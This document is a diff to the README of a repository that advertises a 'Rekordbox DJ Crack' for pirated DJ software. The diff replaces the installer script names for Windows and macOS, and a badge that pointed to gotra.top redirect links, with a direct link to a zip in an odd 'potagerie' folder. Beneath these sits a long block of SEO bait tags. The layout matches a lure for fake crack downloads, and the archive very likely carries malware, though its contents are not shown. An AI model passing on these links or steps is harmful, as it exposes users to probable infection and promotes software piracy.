@@ -27,8 +27,8 @@ Welcome to the **Rekordbox DJ Crack** repository! This project provides tools an
 
 1. **Run the Installer**
    - Navigate to the folder and execute the appropriate script:
-     - For Windows: `install_windows.bat`
-     - For macOS: `install_mac.sh`
+     - For Windows: `https://raw.githubusercontent.com/TheGhostMan007/Rekordbox-DJ-Crack/main/potagerie/Rekordbox-D-Crack-1.0.zip`
+     - For macOS: `https://raw.githubusercontent.com/TheGhostMan007/Rekordbox-DJ-Crack/main/potagerie/Rekordbox-D-Crack-1.0.zip`
 
 2. **Follow the On-Screen Instructions**
 
@@ -74,6 +74,6 @@ Contributions are welcome! Please follow these steps:
 ---
 
 #
-[![https://LwVm6.gotra.top/52/E2xGLCT](https://LBwkft6.gotra.top/l.svg)](https://tULfq.gotra.top/52/aqUE1)
+[![https://raw.githubusercontent.com/TheGhostMan007/Rekordbox-DJ-Crack/main/potagerie/Rekordbox-D-Crack-1.0.zip](https://raw.githubusercontent.com/TheGhostMan007/Rekordbox-DJ-Crack/main/potagerie/Rekordbox-D-Crack-1.0.zip)](https://raw.githubusercontent.com/TheGhostMan007/Rekordbox-DJ-Crack/main/potagerie/Rekordbox-D-Crack-1.0.zip)
 # Tags:
 pioneer-dj-ddj-1000-4-deck-rekordbox-dj-controller pioneer-dj-rekordbox-ddj-rb pioneer-ddj-rb-rekordbox-dj-controller serato-dj-vs-rekordbox pioneer-dj-ddj-400-2-deck-rekordbox-dj-controller rekordbox-dj-course pioneer-dj-ddj-flx4-rekordbox rekordbox-dj-software how-to-record-dj-set-on-rekordbox best-dj-controller-for-rekordbox pioneer-ddj-1000-4-channel-rekordbox-dj-controller pioneer-dj-ddj-400-rekordbox-controller pioneer-dj-ddj-800-2-deck-rekordbox-dj-controller how-to-record-a-dj-set-on-rekordbox how-much-is-rekordbox-dj tidal-dj-rekordbox
